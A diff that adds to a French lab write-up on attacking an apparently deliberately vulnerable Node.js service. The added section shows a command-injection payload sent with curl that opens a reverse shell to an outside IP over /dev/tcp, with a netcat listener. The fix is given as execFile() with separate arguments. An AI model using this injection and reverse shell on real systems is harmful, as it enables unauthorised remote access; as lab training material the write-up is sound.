@@ -356,6 +356,19 @@ curl -X POST http://vulnnode.infres.fr/post.html --data-urlencode "lookup=google
 ```
 `uid=1000(node) gid=1000(node)`
 
+Ainsi, nous pouvons faire un reverse shell.
+Sur notre machine (attaquant) :
+```bash
+nc -lvnp 9001
+```
+
+Payload :
+```bash
+curl -X POST http://vulnnode.infres.fr/post.html --data-urlencode "lookup=google.com; bash -c 'sh -i >& /dev/tcp/159.31.66.203/9001 0>&1'"
+```
+
+La connexion a été faites depuis `10.42.0.82:46442`.
+
 Pour prévenir cela, nous pouvons utiliser `execFile()` avec des arguments séparés au lieu de concaténer l'input utilisateur avec une commande shell.
 
 ## Étape 3 : Credentials pour mouvement latéral
